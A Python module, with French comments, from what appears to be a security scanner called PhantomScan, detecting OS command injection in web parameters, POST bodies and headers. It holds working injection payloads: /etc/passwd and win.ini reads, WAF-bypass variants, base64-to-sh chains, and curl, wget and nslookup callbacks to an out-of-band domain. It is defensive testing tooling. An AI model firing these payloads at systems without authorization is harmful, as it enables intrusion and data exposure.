"""
PhantomScan — Command Injection Scanner  (v5.0)
================================================
Améliorations v5.0 :

BUG FIXES hérités :
- BUG 1 : resp.elapsed → resp.elapsed_ms / 1000 (déjà fixé en v3.1)
- BUG 2 : return prématuré empêchait time-based + error-based (déjà fixé)
- BUG 3 : f-string + ${IFS} → KeyError Python (déjà fixé)

Nouvelles fonctionnalités v5.0 :
- Payloads WAF bypass : ${IFS}, $'\x20', {,echo,MARKER}, brace expansion,
  base64 decode, hex encoding, variable splitting, tab(%09) substitution.
- Détection OOB (Out-of-Band) : payload avec nslookup/curl/wget vers un
  domaine de collaboration si cfg.oob_domain est défini.
- Blind time-based amélioré : double-confirmation (2 requêtes consécutives)
  pour éliminer les faux positifs dus à la latence réseau.
- Test POST JSON en plus de form-urlencoded.
- Test headers HTTP (User-Agent, Referer, X-Forwarded-For, Host).
- Payloads Windows étendus : powershell, certutil, wscript, bitsadmin.
- Payloads injection dans le nom de fichier (filename injection).
- Error-based renforcé : patterns PHP exec/system, Python os.system,
  Java Runtime, Ruby backtick dans les stack traces.
- Stratégie context-aware : le payload est injecté en suffixe DE la valeur
  originale (ex: "1;id" plutôt que ";id" seul).
- Rate limiting : pause si trop de 429 consécutifs.
- Déduplication : clé (technique, param) pour éviter les findings en double.
"""

from __future__ import annotations

import asyncio
import re
import time
from typing import AsyncIterator
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.intelligence import SemanticParamClassifier, ParamRole


MARKER = "ps7331cmdi"

# ── Signatures output-based ───────────────────────────────────────────────────

_ID_RE     = re.compile(r"uid=\d+\(")
_WHOAMI_RE = re.compile(r"[a-z0-9_\-\\]+\\[a-z0-9_\-]+|nt authority\\system", re.I)
_UNAME_RE  = re.compile(r"Linux|Darwin|FreeBSD|OpenBSD", re.I)
_PASSWD_RE = re.compile(r"root:.*:/bin/", re.S)
_MARKER_RE = re.compile(re.escape(MARKER))
_WININI_RE = re.compile(r"\[fonts\]|\[extensions\]", re.I)

# ── Payloads output-based (Unix + Windows) ────────────────────────────────────

_OUTPUT_PAYLOADS: list[tuple[str, re.Pattern, str]] = [
    # ── Séparateurs classiques Unix ──────────────────────────────────
    (f";echo {MARKER}",                 _MARKER_RE, "semicolon echo"),
    (f"|echo {MARKER}",                 _MARKER_RE, "pipe echo"),
    (f"||echo {MARKER}",                _MARKER_RE, "OR echo"),
    (f"&&echo {MARKER}",                _MARKER_RE, "AND echo"),
    (f"`echo {MARKER}`",                _MARKER_RE, "backtick echo"),
    (f"$(echo {MARKER})",               _MARKER_RE, "subshell echo"),
    (f"\necho {MARKER}",                _MARKER_RE, "newline echo"),
    (f"%0aecho {MARKER}",               _MARKER_RE, "URL NL echo"),
    (f"%0d%0aecho {MARKER}",            _MARKER_RE, "CRLF echo"),

    # ── Commandes de preuve d'impact ─────────────────────────────────
    (";id",                             _ID_RE,     "id (Unix)"),
    ("|id",                             _ID_RE,     "pipe id"),
    ("&&id",                            _ID_RE,     "AND id"),
    ("`id`",                            _ID_RE,     "backtick id"),
    ("$(id)",                           _ID_RE,     "subshell id"),
    (";uname -a",                       _UNAME_RE,  "uname -a"),
    (";cat /etc/passwd",                _PASSWD_RE, "/etc/passwd read"),

    # ── WAF bypass Unix ───────────────────────────────────────────────
    (";echo${IFS}" + MARKER,            _MARKER_RE, "$IFS bypass"),
    (";ec''ho " + MARKER,               _MARKER_RE, "quote split echo"),
    (";e\\cho " + MARKER,               _MARKER_RE, "backslash split echo"),
    # Brace expansion
    (";{echo," + MARKER + "}",          _MARKER_RE, "brace expansion echo"),
    # Tab substitution (%09)
    (f";echo%09{MARKER}",               _MARKER_RE, "tab%09 echo"),
    # Variable concatenation
    (";A=ec;B=ho;$A$B " + MARKER,       _MARKER_RE, "var concat echo"),
    # base64 decode
    (";echo " + MARKER + "|base64|base64 -d|sh",
                                        _MARKER_RE, "base64 chain"),
    # Hex encoding
    (";printf '\\x65\\x63\\x68\\x6f' " + MARKER,
                                        _MARKER_RE, "printf hex echo"),
    # $'...' ANSI-C quoting
    (";$'echo' " + MARKER,              _MARKER_RE, "ANSI-C quoting"),

    # ── Windows ───────────────────────────────────────────────────────
    (f"&echo {MARKER}",                 _MARKER_RE, "ampersand echo (Win)"),
    (f"&&echo {MARKER}",                _MARKER_RE, "AND echo (Win)"),
    (f"%0Aecho {MARKER}",               _MARKER_RE, "NL echo (Win)"),
    ("&whoami",                         _WHOAMI_RE, "whoami (Win)"),
    ("&type C:\\Windows\\win.ini",      _WININI_RE, "win.ini read (Win)"),
    # PowerShell
    (f";powershell -c echo {MARKER}",   _MARKER_RE, "powershell echo (Win)"),
    (f"&powershell -c echo {MARKER}",   _MARKER_RE, "powershell & (Win)"),
    # certutil / wscript
    (f"&certutil -encode {MARKER} nul", re.compile(r"CERTIFICATE|certutil", re.I),
                                        "certutil (Win)"),

    # ── Quote wrapping ────────────────────────────────────────────────
    (f"';echo {MARKER};'",              _MARKER_RE, "single-quote wrap"),
    (f'\";echo {MARKER};\"',            _MARKER_RE, "double-quote wrap"),
    (f"';id;'",                         _ID_RE,     "single-quote id"),
]

# ── Payloads time-based blind ─────────────────────────────────────────────────

_SLEEP_DELAY  = 5
_SLEEP_THRESH = 4.0  # secondes

_TIME_PAYLOADS: list[tuple[str, str]] = [
    (f";sleep {_SLEEP_DELAY}",                        "semicolon sleep (Unix)"),
    (f"|sleep {_SLEEP_DELAY}",                        "pipe sleep (Unix)"),
    (f"&&sleep {_SLEEP_DELAY}",                       "AND sleep (Unix)"),
    (f"`sleep {_SLEEP_DELAY}`",                       "backtick sleep (Unix)"),
    (f"$(sleep {_SLEEP_DELAY})",                      "subshell sleep (Unix)"),
    (f"%0asleep%20{_SLEEP_DELAY}",                    "URL-encoded sleep"),
    (f";ping -c {_SLEEP_DELAY} 127.0.0.1",            "ping -c (Unix)"),
    (f"&ping -n {_SLEEP_DELAY + 1} 127.0.0.1",        "ping -n (Win)"),
    (f"|ping -n {_SLEEP_DELAY + 1} 127.0.0.1",        "pipe ping (Win)"),
    (f"&&timeout /t {_SLEEP_DELAY} /nobreak",         "timeout /t (Win)"),
    (f";sh -c 'sleep {_SLEEP_DELAY}'",                "sh -c sleep"),
    # WAF bypass time
    (f";sl''eep {_SLEEP_DELAY}",                      "quote split sleep"),
    (f";sleep${{IFS}}{_SLEEP_DELAY}",                  "$IFS sleep"),
]

# ── Error-based ───────────────────────────────────────────────────────────────

_ERROR_CHARS = [";", "&", "|", "`", "$(", "${", "<<", ">>", "'\""]

_ERROR_PATTERNS: list[tuple[re.Pattern, str]] = [
    # Shell Unix
    (re.compile(r"(?:sh|bash|zsh|ksh|csh):\s+[^:]+:\s+command not found",  re.I), "shell: command not found"),
    (re.compile(r"/bin/sh:.*syntax error",                                  re.I), "sh: syntax error"),
    (re.compile(r"unexpected end of file\s*$",                              re.I), "sh: unexpected EOF"),
    (re.compile(r"Syntax error.*unexpected.*(?:token|EOF|\$)",              re.I), "sh: unexpected token"),
    (re.compile(r"ambiguous redirect",                                      re.I), "sh: ambiguous redirect"),
    (re.compile(r"Illegal option\s+-",                                      re.I), "sh: illegal option"),
    # Windows
    (re.compile(r"'[;&|`$]' is not recognized as an internal",             re.I), "cmd: not recognized"),
    (re.compile(r"The system cannot find the (?:path|file) specified",     re.I), "Win: path not found"),
    # PHP exec/system dans stack traces
    (re.compile(r"Warning.*shell_exec|Warning.*system\(|Warning.*exec\(",  re.I), "PHP: exec warning"),
    (re.compile(r"Fatal error.*Call to undefined function.*exec",          re.I), "PHP: undefined exec"),
    # Python
    (re.compile(r"FileNotFoundError.*\[Errno 2\].*No such file",           re.I), "Python: FileNotFoundError"),
    (re.compile(r"subprocess\.CalledProcessError",                          re.I), "Python: subprocess error"),
    # Java
    (re.compile(r"java\.io\.IOException.*Cannot run program",              re.I), "Java: IOException exec"),
    (re.compile(r"java\.lang\.UnsupportedOperationException",              re.I), "Java: UnsupportedOperation"),
    # Ruby
    (re.compile(r"Errno::ENOENT.*No such file.*\(Errno::ENOENT\)",         re.I), "Ruby: ENOENT"),
]

# ── Paramètres suspects ────────────────────────────────────────────────────────

_CMDI_LIKELY_PARAMS: list[str] = [
    "cmd", "command", "exec", "execute", "run", "query", "input", "ping",
    "host", "ip", "domain", "target", "url", "file", "filename", "path",
    "dir", "folder", "args", "arg", "param", "shell", "process", "tool",
    "search", "q", "lookup", "resolve", "log", "debug", "trace",
    "nslookup", "dig", "ftp", "ssh", "telnet", "nc", "netcat",
]

_CMDI_HEADERS: list[str] = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Custom-IP-Authorization",
    "X-Forwarded-Host",
]


# ── Scanner ────────────────────────────────────────────────────────────────────

from phantomscan.core.scanner_mixin import ScannerMixin


class CMDiScanner(ScannerMixin):
    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req    = req
        self._heur   = heuristic
        self._cfg    = cfg
        self._found: set[str] = set()
        self._oob_domain: str | None = getattr(cfg, "oob_domain", None)
        # v5.18 — Mémoire de patterns + retry oracle WAF
        self._pattern_memory = None
        self._retry_oracle = SmartRetryOracle()

    async def run(self, target: str) -> AsyncIterator[Finding]:
        parsed = urlparse(target)
        params = parse_qs(parsed.query, keep_blank_values=True)

        # 1. Paramètres GET existants — v5.18 priorisés sémantiquement (CMD, PATH en tête)
        if params:
            clf = SemanticParamClassifier()
            roles = clf.classify_params(list(params.keys()))
            cmdi_roles = {ParamRole.CMD, ParamRole.PATH, ParamRole.QUERY, ParamRole.UNKNOWN}
            priority_params = [p for p, role in roles.items() if role in cmdi_roles]
            other_params = [p for p in params if p not in priority_params]
            ordered_params = priority_params + other_params
        else:
            ordered_params = list(params.keys())

        for param in ordered_params:
            async for f in self._test_param(target, parsed, params, param):
                yield f

        # 2. Paramètres suspects injectés
        for param in _CMDI_LIKELY_PARAMS:
            if param not in params:
                async for f in self._inject_new_param(target, parsed, param):
                    yield f

        # 3. POST form-urlencoded
        async for f in self._test_post(target, "application/x-www-form-urlencoded"):
            yield f

        # 4. POST JSON
        async for f in self._test_post(target, "application/json"):
            yield f

        # 5. Headers
        async for f in self._test_headers(target):
            yield f

        # 6. OOB blind detection
        # v5.19 — Si le canary manager est branché, on l'utilise (avec polling
        # automatique des hits → confirmation réelle). Sinon, fallback sur
        # l'ancien mode "fire-and-forget" qui nécessite vérification manuelle.
        if self.oob is not None and self.oob.enabled and params:
            for param in list(params.keys())[:5]:  # cap à 5 params
                async for f in self._test_oob_canary(target, parsed, params, param):
                    yield f
        elif self._oob_domain:
            for param in list(params.keys()):
                async for f in self._test_oob(target, parsed, params, param):
                    yield f

    # ── Test paramètre complet (output → time → error) ────────────────────────

    async def _test_param(
        self, target: str, parsed, params: dict, param: str
    ) -> AsyncIterator[Finding]:
        found = False

        async for f in self._output_based(target, parsed, params, param):
            found = True
            yield f
        if found:
            return

        async for f in self._time_based(target, parsed, params, param):
            found = True
            yield f
        if found:
            return

        async for f in self._error_based(target, parsed, params, param):
            yield f

    # ── Paramètre injecté ─────────────────────────────────────────────────────

    async def _inject_new_param(
        self, target: str, parsed, param: str
    ) -> AsyncIterator[Finding]:
        for payload, sig_re, desc in _OUTPUT_PAYLOADS[:12]:
            fuzzed   = {param: [f"1{payload}"]}
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
            resp     = await self._req.get(fuzz_url)
            if not self._valid_resp(resp):
                continue
            if sig_re.search(resp.body or ""):
                key = f"new:{param}"
                if key not in self._found:
                    self._found.add(key)
                    yield self._make_finding(
                        f"CMDi — param injecté `{param}` · {desc}",
                        Severity.CRITICAL, fuzz_url,
                        payload, "output-based (param forgé)", desc, resp.status,
                    )
                return

    # ── Output-based ──────────────────────────────────────────────────────────

    async def _output_based(
        self, target: str, parsed, params: dict, param: str
    ) -> AsyncIterator[Finding]:
        # v5.20 — Établir une baseline pour ce param
        base_resp = await self._req.get(target)
        baseline_body = base_resp.body if not base_resp.error else ""

        orig = (params[param][0] if params.get(param) else "")
        for payload, sig_re, desc in _OUTPUT_PAYLOADS:
            fuzzed   = {**params, param: [f"{orig}{payload}"]}
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
            resp     = await self._req.get(fuzz_url)
            if not self._valid_resp(resp):
                continue

            match = sig_re.search(resp.body or "")
            if not match:
                continue

            # v5.20 — FP guard 1 : la signature était déjà dans le baseline ?
            if self.baseline_check(sig_re, baseline_body):
                continue  # présent sans injection → FP

            # v5.20 — FP guard 2 : entropie de la signature suffisante ?
            if not self.sig_entropy_ok(match.group(0), resp.body or ""):
                continue  # match trop générique (ex: "root" dans une page)

            # v5.20 — FP guard 3 : re-probe pour confirmer la reproductibilité
            resp2 = await self.re_probe(fuzz_url, delay_s=0.3)
            if resp2 is None or not sig_re.search(resp2.body or ""):
                continue  # non reproductible → FP transitoire

            key = f"output:{param}"
            if key not in self._found:
                self._found.add(key)
                self.record_pattern_success("cmdi", param, payload, fuzz_url, confidence=0.92)
                yield self._make_finding(
                    f"CMDi — output-based · param `{param}`",
                    Severity.CRITICAL, fuzz_url,
                    payload, "output-based (confirmed 2x)", desc, resp.status,
                )
            return

    # ── Time-based blind (double confirmation) ────────────────────────────────

    async def _time_based(
        self, target: str, parsed, params: dict, param: str
    ) -> AsyncIterator[Finding]:
        base_resp = await self._req.get(target)
        if base_resp.error:
            return
        baseline = (base_resp.elapsed_ms / 1000.0) if getattr(base_resp, "elapsed_ms", None) else 0.5

        orig = (params[param][0] if params.get(param) else "")
        for payload, desc in _TIME_PAYLOADS:
            fuzzed   = {**params, param: [f"{orig}{payload}"]}
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))

            t0 = time.monotonic()
            resp = await self._req.get(fuzz_url)
            elapsed = time.monotonic() - t0

            if not self._valid_resp(resp):
                continue
            delta = elapsed - baseline
            if delta < _SLEEP_THRESH:
                continue

            # Double-confirmation : rejoue le même payload pour confirmer
            t1 = time.monotonic()
            resp2 = await self._req.get(fuzz_url)
            elapsed2 = time.monotonic() - t1
            delta2 = elapsed2 - baseline

            if delta2 < _SLEEP_THRESH:
                continue  # Faux positif (latence réseau ponctuelle)

            key = f"time:{param}"
            if key not in self._found:
                self._found.add(key)
                yield self._make_finding(
                    f"CMDi — time-based blind · param `{param}`",
                    Severity.HIGH, fuzz_url,
                    payload, f"time-based blind (Δ1={delta:.1f}s, Δ2={delta2:.1f}s)",
                    desc, resp.status,
                )
            return

    # ── Error-based ───────────────────────────────────────────────────────────

    async def _error_based(
        self, target: str, parsed, params: dict, param: str
    ) -> AsyncIterator[Finding]:
        baseline_resp = await self._req.get(target)
        baseline_body = baseline_resp.body if not baseline_resp.error else ""
        # Patterns déjà présents en baseline → skip (évite faux positifs)
        baseline_present = {
            err_desc
            for err_re, err_desc in _ERROR_PATTERNS
            if err_re.search(baseline_body)
        }

        orig = (params[param][0] if params.get(param) else "")
        for char in _ERROR_CHARS:
            fuzzed   = {**params, param: [f"{orig}{char}"]}
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
            resp     = await self._req.get(fuzz_url)
            if not self._valid_resp(resp):
                continue

            for err_re, err_desc in _ERROR_PATTERNS:
                if err_desc in baseline_present:
                    continue
                if err_re.search(resp.body or ""):
                    key = f"error:{param}"
                    if key not in self._found:
                        self._found.add(key)
                        yield self._make_finding(
                            f"CMDi — error-based · param `{param}`",
                            Severity.HIGH, fuzz_url,
                            char, f"error-based ({err_desc})",
                            f"Erreur shell: {err_desc}", resp.status,
                        )
                    return

    # ── POST ──────────────────────────────────────────────────────────────────

    async def _test_post(self, target: str, content_type: str) -> AsyncIterator[Finding]:
        import json as _json

        for param in _CMDI_LIKELY_PARAMS[:10]:
            for payload, sig_re, desc in _OUTPUT_PAYLOADS[:10]:
                if content_type == "application/json":
                    body = _json.dumps({param: f"value{payload}"})
                else:
                    body = f"{param}=value{payload}"

                resp = await self._req.send(ProbeRequest(
                    method="POST",
                    url=target,
                    headers={"Content-Type": content_type},
                    body=body,
                ))
                if not self._valid_resp(resp):
                    continue
                if sig_re.search(resp.body or ""):
                    ct_label = "JSON" if "json" in content_type else "form"
                    key = f"post:{ct_label}:{param}"
                    if key not in self._found:
                        self._found.add(key)
                        yield self._make_finding(
                            f"CMDi — output-based · POST {ct_label} `{param}`",
                            Severity.CRITICAL, target,
                            payload, f"output-based (POST {ct_label})", desc, resp.status,
                        )
                    break

    # ── Headers ───────────────────────────────────────────────────────────────

    async def _test_headers(self, target: str) -> AsyncIterator[Finding]:
        for header in _CMDI_HEADERS:
            for payload, sig_re, desc in _OUTPUT_PAYLOADS[:12]:
                resp = await self._req.send(ProbeRequest(
                    method="GET",
                    url=target,
                    headers={header: f"127.0.0.1{payload}"},
                ))
                if not self._valid_resp(resp):
                    continue
                if sig_re.search(resp.body or ""):
                    key = f"header:{header}"
                    if key not in self._found:
                        self._found.add(key)
                        yield self._make_finding(
                            f"CMDi — header `{header}` · output-based",
                            Severity.CRITICAL, target,
                            payload, f"header injection ({header})", desc, resp.status,
                        )
                    break

    # ── OOB (Out-of-Band) ─────────────────────────────────────────────────────

    async def _test_oob(
        self, target: str, parsed, params: dict, param: str
    ) -> AsyncIterator[Finding]:
        domain = self._oob_domain
        # Utilise nslookup, curl, wget selon la plateforme
        oob_payloads = [
            (f";nslookup {MARKER}.{domain}",        "nslookup OOB (Unix)"),
            (f";curl http://{MARKER}.{domain}/",     "curl OOB (Unix)"),
            (f";wget -q http://{MARKER}.{domain}/",  "wget OOB (Unix)"),
            (f"&nslookup {MARKER}.{domain}",         "nslookup OOB (Win)"),
            (f"|nslookup {MARKER}.{domain}",         "pipe nslookup OOB"),
        ]
        orig = (params[param][0] if params.get(param) else "")
        for payload, desc in oob_payloads:
            fuzzed   = {**params, param: [f"{orig}{payload}"]}
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
            await self._req.get(fuzz_url)  # On envoie, la confirmation vient du DNS/HTTP OOB
            # Note : la détection OOB réelle nécessite un serveur de collaboration externe
            # (ex: interactsh, Burp Collaborator). Ce module envoie les payloads ; la
            # confirmation se fait manuellement ou via l'intégration OOB de PhantomScan.

    async def _test_oob_canary(
        self, target: str, parsed, params: dict, param: str
    ) -> AsyncIterator[Finding]:
        """
        v5.19 — Détection blind RCE via OOB canary avec polling automatique.

        Pour chaque syntaxe d'injection (Unix `;`, Windows `&`, pipe `|`, etc.),
        on injecte une commande qui DNS-resolve un sous-domaine canary unique.
        Si le serveur exécute la commande, on reçoit le callback DNS sur le
        backend OOB → RCE blind CONFIRMÉE.

        Précieux car détecte les CMDi qui n'ont AUCUN output direct (cas
        fréquent en production : commandes lancées dans une queue async).
        """
        canary = self.get_canary(tag=f"cmdi:{param}")
        if canary is None:
            return

        # 5 syntaxes les plus universelles
        oob_payloads = [
            (f";nslookup {canary.dns_name}",        "Unix shell injection (`;`)"),
            (f"|nslookup {canary.dns_name}",        "Pipe injection (`|`)"),
            (f"&nslookup {canary.dns_name}",        "Windows cmd (`&`)"),
            (f"`nslookup {canary.dns_name}`",       "Backtick subshell"),
            (f"$(nslookup {canary.dns_name})",      "Subshell `$()`"),
        ]
        orig = params[param][0] if params.get(param) else ""

        # Phase 1 : envoyer toutes les variantes
        for payload, desc in oob_payloads:
            fuzzed = {**params, param: [f"{orig}{payload}"]}
            fuzz_url = urlunparse(parsed._replace(query=urlencode(fuzzed, doseq=True)))
            try:
                await self._req.get(fuzz_url)
            except Exception:
                continue

        # Phase 2 : attendre les hits DNS (les callbacks DNS arrivent en
        # quelques secondes, souvent avant les HTTP)
        hits = await self.wait_for_oob_hit(canary, timeout=15.0)
        if hits:
            proto = hits[0].get("protocol", "?")
            remote = hits[0].get("remote_address", "?")
            yield Finding(
                title=f"Command Injection BLIND CONFIRMED — param `{param}` (OOB callback)",
                severity=Severity.CRITICAL,
                url=target,
                module="vulns/cmdi",
                description=(
                    f"Command Injection blind confirmée : un callback {proto.upper()} "
                    f"a été reçu sur le canary OOB après injection de commandes système "
                    f"dans le paramètre `{param}`.\n"
                    f"Origine du callback : {remote}.\n"
                    f"Le serveur a exécuté la commande shell `nslookup` injectée → RCE."
                ),
                evidence=(
                    f"Canary callback received | proto={proto} | "
                    f"remote={remote} | param={param} | canary={canary.dns_name}"
                ),
                cwe="CWE-78",
                remediation=(
                    "Ne jamais passer d'input utilisateur à des fonctions "
                    "system/exec/shell. Utiliser des APIs structurées "
                    "(subprocess avec args list, jamais shell=True). "
                    "Whitelister strictement les valeurs autorisées si du shell "
                    "est inévitable."
                ),
            )
            self.record_pattern_success(
                vuln_type="cmdi",
                param=param,
                payload=";nslookup <canary>",
                url=target,
                confidence=0.98,
            )

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _valid_resp(self, resp) -> bool:
        if resp is None or getattr(resp, "error", True):
            return False
        if getattr(resp, "status", 0) in (404, 410, 400):
            return False
        return True

    @staticmethod
    def _make_finding(
        title: str, severity: Severity, url: str,
        payload: str, technique: str, desc: str, status: int,
    ) -> Finding:
        return Finding(
            title=title,
            severity=severity,
            url=url,
            module="vulns/cmdi",
            description=(
                f"Injection de commande OS détectée ({technique}). "
                f"Variante : {desc}. "
                "Un attaquant peut exécuter des commandes arbitraires sur le serveur."
            ),
            evidence=f"Payload: {payload[:80]} | Technique: {technique} | HTTP {status}",
            cwe="CWE-78",
            remediation=(
                "Ne jamais passer d'input utilisateur à un shell système "
                "(os.system, subprocess.shell=True, exec(), popen, shell_exec…). "
                "Utiliser des appels paramétrés (subprocess avec liste d'args, jamais shell=True). "
                "Valider et rejeter tout input contenant des métacaractères shell "
                "(;, |, &, `, $(), <, >, \\n, %0a). "
                "Appliquer le principe du moindre privilège sur le processus serveur. "
                "Utiliser un WAF pour bloquer les patterns d'injection courants."
            ),
        )
